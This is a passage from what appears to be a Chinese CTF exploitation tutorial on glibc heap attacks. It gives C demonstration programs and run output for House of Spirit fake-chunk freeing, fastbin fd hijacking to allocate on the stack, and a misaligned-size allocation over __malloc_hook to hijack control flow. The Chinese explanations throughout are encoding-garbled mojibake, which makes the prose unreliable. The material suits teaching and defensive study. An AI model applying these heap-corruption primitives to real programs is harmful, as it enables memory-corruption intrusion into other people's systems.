chunk</code>ï¼Œå¹¶å°†å…¶é‡Šæ”¾ï¼Œä»è€Œå®ç°åˆ†é…æŒ‡å®šåœ°å€çš„ <code>chunk</code></strong></p></blockquote><p>è¦æƒ³æ„é€  <code>fast bin fake chunk</code> å¹¶ä¸”å°†å…¶é‡Šæ”¾æ—¶ï¼Œå¯ä»¥å°†å…¶æ”¾å…¥åˆ°å¯¹åº”çš„ <code>fast bin</code> é“¾è¡¨ä¸­ï¼Œä½†éœ€è¦ç»•è¿‡ä¸€äº›å¿…è¦çš„æ£€æµ‹ï¼š</p><ul><li><code>fake chunk</code> çš„ <code>ISMMAP</code> ä½ä¸èƒ½ä¸º 1ï¼Œå› ä¸º <code>free</code> æ—¶ï¼Œå¦‚æœæ˜¯ <code>mmap</code> çš„ <code>chunk</code>ï¼Œä¼šå•ç‹¬å¤„ç†</li><li><code>fake chunk</code> åœ°å€éœ€è¦å¯¹é½ï¼Œ<code>MALLOC_ALIGN_MASK</code></li><li><code>fake chunk</code> çš„ <code>size</code> å¤§å°éœ€è¦æ»¡è¶³å¯¹åº”çš„ <code>fast bin</code> çš„éœ€æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¾—å¯¹é½</li><li><code>fake chunk</code> çš„ <code>next chunk</code> çš„å¤§å°ä¸èƒ½å°äºÂ <code>2 * SIZE_SZ</code>ï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äº<code>av-&gt;system_mem</code></li><li><code>fake chunk</code> å¯¹åº”çš„ <code>fast bin</code> é“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯è¯¥ <code>fake chunk</code>ï¼Œå³ä¸èƒ½æ„æˆ <code>double free</code> çš„æƒ…å†µ</li></ul><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates the house of spirit attack.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Calling malloc() once so that it sets up its memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>    <span class="token comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_chunks<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// this is the size</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) &amp;&amp; &lt; av->system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>    fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment">// nextsize</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œç»“æœï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">This file demonstrates the house of spirit attack<span class="token punctuation">.</span>Calling <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> once so that it sets up its memory<span class="token punctuation">.</span>We will now overwrite a pointer to point to a fake <span class="token char">'fastbin'</span> region<span class="token punctuation">.</span>This <span class="token function">region</span> <span class="token punctuation">(</span>memory of length<span class="token operator">:</span> <span class="token number">80</span><span class="token punctuation">)</span> contains two chunks<span class="token punctuation">.</span> The first starts at <span class="token number">0x7ffc9e07e6d8</span> <span class="token operator">and</span> the second at <span class="token number">0x7ffc9e07e708.</span>This chunk<span class="token punctuation">.</span>size of <span class="token keyword">this</span> region has to be <span class="token number">16</span> more than the <span class="token function">region</span> <span class="token punctuation">(</span>to accomodate the chunk data<span class="token punctuation">)</span> <span class="token keyword">while</span> still falling into the fastbin <span class="token function">category</span> <span class="token punctuation">(</span><span class="token operator">&lt;=</span> <span class="token number">128</span> on x64<span class="token punctuation">)</span><span class="token punctuation">.</span> The <span class="token function">PREV_INUSE</span> <span class="token punctuation">(</span>lsb<span class="token punctuation">)</span> bit is ignored by free <span class="token keyword">for</span> fastbin<span class="token operator">-</span>sized chunks<span class="token punctuation">,</span> however the <span class="token function">IS_MMAPPED</span> <span class="token punctuation">(</span>second lsb<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token function">NON_MAIN_ARENA</span> <span class="token punctuation">(</span>third lsb<span class="token punctuation">)</span> bits cause problems<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that <span class="token keyword">this</span> has to be the size of the next malloc request rounded to the internal size used by the malloc implementation<span class="token punctuation">.</span> E<span class="token punctuation">.</span>g<span class="token punctuation">.</span> on x64<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x38</span> will all be rounded to <span class="token number">0x40</span><span class="token punctuation">,</span> so they would work <span class="token keyword">for</span> the malloc parameter at the end<span class="token punctuation">.</span> The chunk<span class="token punctuation">.</span>size of the <span class="token operator">*</span>next<span class="token operator">*</span> fake region has to be sane<span class="token punctuation">.</span> That is <span class="token operator">></span> <span class="token number">2</span><span class="token operator">*</span><span class="token function">SIZE_SZ</span> <span class="token punctuation">(</span><span class="token operator">></span> <span class="token number">16</span> on x64<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">&lt;</span> av<span class="token operator">-></span><span class="token function">system_mem</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span> <span class="token number">128</span>kb by <span class="token keyword">default</span> <span class="token keyword">for</span> the main arena<span class="token punctuation">)</span> to pass the nextsize integrity checks<span class="token punctuation">.</span> No need <span class="token keyword">for</span> fastbin size<span class="token punctuation">.</span>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk<span class="token punctuation">,</span> <span class="token number">0x7ffc9e07e6d8.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that the memory address of the <span class="token operator">*</span>region<span class="token operator">*</span> associated with <span class="token keyword">this</span> chunk must be <span class="token number">16</span><span class="token operator">-</span>byte aligned<span class="token punctuation">.</span>Freeing the overwritten pointer<span class="token punctuation">.</span>Now the next malloc will <span class="token keyword">return</span> the region of our fake chunk at <span class="token number">0x7ffc9e07e6d8</span><span class="token punctuation">,</span> which will be <span class="token number">0x7ffc9e07e6e0</span><span class="token operator">!</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x7ffc9e07e6e0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æƒ³è¦ä½¿ç”¨ House Of Spirit çš„æŠ€æœ¯åˆ†é… <code>chunk</code> åˆ°æŒ‡å®šåœ°å€ï¼Œå…¶å®å¹¶ä¸éœ€è¦ä¿®æ”¹æŒ‡å®šåœ°å€çš„ä»»ä½•å†…å®¹ï¼Œ<strong>å…³é”®æ˜¯è¦èƒ½å¤Ÿä¿®æ”¹æŒ‡å®šåœ°å€çš„å‰åçš„å†…å®¹ä½¿å…¶å¯ä»¥ç»•è¿‡å¯¹åº”çš„æ£€æµ‹</strong></p></blockquote><hr><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><blockquote><p>è¯¥æŠ€æœ¯çš„æ ¸å¿ƒç‚¹åœ¨äºåŠ«æŒ <code>fast bin</code> é“¾è¡¨ä¸­ <code>chunk</code> çš„ <code>fd</code> æŒ‡é’ˆï¼Œ<strong>æŠŠ <code>fd</code> æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æƒ³è¦åˆ†é…çš„æ ˆä¸Šï¼Œä»è€Œå®ç°æ§åˆ¶æ ˆä¸­çš„ä¸€äº›å…³é”®æ•°æ®</strong>ï¼Œæ¯”å¦‚ï¼šè¿”å›åœ°å€ç­‰ï¼Œéœ€è¦æ ˆä¸Šå­˜åœ¨æœ‰æ»¡è¶³æ¡ä»¶çš„ <code>size</code> å€¼</p></blockquote><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_chunk</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pre_size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> fd<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> bk<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CHUNK<span class="token punctuation">,</span> <span class="token operator">*</span>PCHUNK<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    CHUNK stack_chunk<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>    stack_chunk<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token operator">&amp;</span>stack_chunk<span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™æ¬¡æˆ‘ä»¬æŠŠ <code>fake_chunk</code> ç½®äºæ ˆä¸­ç§°ä¸º <code>stack_chunk</code></p><p>åŒæ—¶åŠ«æŒäº† <code>fast bin</code> é“¾è¡¨ä¸­ <code>chunk</code> çš„ <code>fd</code> å€¼ï¼Œé€šè¿‡æŠŠè¿™ä¸ª <code>fd</code> å€¼æŒ‡å‘ <code>stack_chunk</code> å°±å¯ä»¥å®ç°åœ¨æ ˆä¸­åˆ†é… <code>fast bin chunk</code></p></blockquote><p>æ‰§è¡Œ <code>*(long long *)chunk1=&amp;stack_chunk</code> åï¼Œ<code>chunk1</code> çš„ <code>fd</code> æŒ‡é’ˆæŒ‡å‘äº† <code>stack_chunk</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A852.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨52.png"></p><p>ç¬¬ä¸€æ¬¡æ‰§è¡ŒÂ <code>malloc</code> ä½¿å¾— <code>fast bin</code> é“¾è¡¨æŒ‡å‘äº† <code>stack_chunk</code>ï¼Œè¿™æ„å‘³ç€ä¸‹ä¸€æ¬¡åˆ†é…ä¼šä½¿ç”¨ <code>stack_chunk</code> çš„å†…å­˜è¿›è¡Œï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A853.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨53.png"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬äºŒæ¬¡æ‰§è¡Œ <code>malloc</code> çš„è¿”å›å€¼ RAX ä¸º 0x7fffffffdc80ï¼Œä¹Ÿå°±æ˜¯ <code>stack_chunk</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A854.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨54.png"></p><p><code>stack_chunk</code> çš„åœ°å€åœ¨æ ˆä¸Šï¼Œè€Œä¸åœ¨å †ä¸Šï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A855.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨55.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A856.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨56.png"></p><hr><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><blockquote><p>Arbitrary Alloc å…¶å®ä¸ Alloc to stack æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯<strong>åˆ†é…çš„ç›®æ ‡ä¸å†æ˜¯æ ˆä¸­</strong></p><p>Arbitrary Alloc åœ¨ CTF ä¸­ä½¿ç”¨æ›´åŠ é¢‘ç¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å­—èŠ‚é”™ä½ç­‰æ–¹æ³•æ¥ç»•è¿‡ <code>size</code> åŸŸçš„æ£€éªŒï¼Œå®ç°ä»»æ„åœ°å€åˆ†é… <code>chunk</code>ï¼Œæœ€åçš„æ•ˆæœä¹Ÿå°±ç›¸å½“äº<strong>ä»»æ„åœ°å€å†™ä»»æ„å€¼</strong></p></blockquote><p>å®é™…ä¸Šï¼Œåªè¦æ»¡è¶³ç›®æ ‡åœ°å€å­˜åœ¨åˆæ³•çš„ <code>size</code> åŸŸï¼ˆè¿™ä¸ª <code>size</code> åŸŸæ˜¯æ„é€ çš„ï¼Œè¿˜æ˜¯è‡ªç„¶å­˜åœ¨çš„éƒ½æ— å¦¨ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ <code>chunk</code> åˆ†é…åˆ°ä»»æ„çš„å¯å†™å†…å­˜ä¸­ï¼Œæ¯”å¦‚ï¼š<code>bss</code>ã€<code>heap</code>ã€<code>data</code>ã€<code>stack</code> ç­‰ç­‰</p><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token number">0x7ffff7dd1af5</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨å­—èŠ‚é”™ä½æ¥å®ç°ç›´æ¥åˆ†é… <code>fast bin</code> åˆ° <code>__malloc_hook</code> çš„ä½ç½®ï¼Œç›¸å½“äºè¦†ç›– <code>__malloc_hook</code> æ¥æ§åˆ¶ç¨‹åºæµç¨‹</p></blockquote><p>ä¸Šè¿°ä»£ç ä¸­çš„ <code>0x7ffff7dd1af5</code> æ˜¯æ ¹æ®æœ¬æœºçš„æƒ…å†µå¾—å‡ºçš„å€¼ï¼Œæƒ³è¦å¾—åˆ°è¿™ä¸ªå€¼ï¼Œé¦–å…ˆæˆ‘ä»¬è¦è§‚å¯Ÿæ¬²å†™å…¥åœ°å€ <code>__malloc_hook</code> é™„è¿‘æ˜¯å¦å­˜åœ¨å¯ä»¥å­—èŠ‚é”™ä½çš„æƒ…å†µ</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A857.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨57.png"></p><p>å›¾ä¸­ <code>0x7ffff7dd1b10</code> æ˜¯æˆ‘ä»¬æƒ³è¦æ§åˆ¶çš„ <code>__malloc_hook</code> çš„åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬å‘ä¸Šå¯»æ‰¾æ˜¯å¦å¯ä»¥é”™ä½å‡ºä¸€ä¸ªåˆæ³•çš„ <code>size</code> åŸŸã€‚å› ä¸ºè¿™æ˜¯ä¸ª 64 ä½ç¨‹åºï¼Œå› æ­¤ <code>fast bin</code> çš„èŒƒå›´ä¸º 32 å­—èŠ‚åˆ° 128 å­—èŠ‚ (<code>0x20 - 0x80</code>)</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//è¿™é‡Œçš„ size æŒ‡ç”¨æˆ·åŒºåŸŸï¼Œå› æ­¤è¦å° 2 å€ SIZE_SZ</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§‚å¯Ÿå‘ç° <code>0x7ffff7dd1af5</code> å¤„å¯ä»¥å®ç°é”™ä½æ„é€ å‡ºä¸€ä¸ª <code>0x000000000000007f</code>ï¼Œå› ä¸º <code>0x7f</code> åœ¨è®¡ç®— <code>fast bin index</code> æ—¶ï¼Œæ˜¯å±äº <code>index 5</code> çš„ï¼Œå³ <code>chunk</code> å¤§å°ä¸º <code>0x70</code>ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">##define <span class="token function">fastbin_index</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                                      \    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span>SIZE_SZ <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment">// æ³¨æ„ sz çš„å¤§å°æ˜¯ unsigned intï¼Œå› æ­¤åªå  4 ä¸ªå­—èŠ‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è€Œ <code>chunk</code> å¤§å°ä¸º <code>0x70</code> åˆåŒ…å«äº† <code>0x10</code> çš„ <code>chunk_header</code>ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©åˆ†é… <code>0x60</code> çš„ <code>fast bin</code>ï¼Œå°†å…¶åŠ å…¥é“¾è¡¨ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A858.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨58.png"></p><p>ç»è¿‡ä¸¤æ¬¡ <code>malloc</code> åˆ†é…åï¼Œå¯ä»¥è§‚å¯Ÿåˆ° <code>chunk</code> è¢«åˆ†é…åˆ° <code>0x7ffff7dd1afd</code>ï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ§åˆ¶ <code>__malloc_hook</code> çš„å†…å®¹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A859.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨59.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A860.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨60.png"></p><p>åœ¨æˆ‘çš„ Glibc 2.23 ä¸­ <code>__realloc_hook</code> ä¸ 